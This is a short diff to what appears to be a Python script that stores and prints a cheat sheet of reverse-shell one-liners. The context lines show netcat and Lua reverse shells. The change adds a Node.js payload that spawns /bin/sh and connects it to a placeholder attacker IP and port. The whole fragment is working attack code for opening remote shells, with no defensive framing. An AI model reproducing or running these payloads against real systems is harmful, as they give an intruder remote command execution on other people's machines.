@@ -30,6 +30,10 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
 [lua]
 
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('<ip>','<port>');os.execute('/bin/sh -i <&3 >&3 2>&3');"
+
+[javascript]
+
+(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/sh", []);var client = new net.Socket();client.connect(<port>, "<ip>", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();
 '''
 
 def shellDoc(argv):
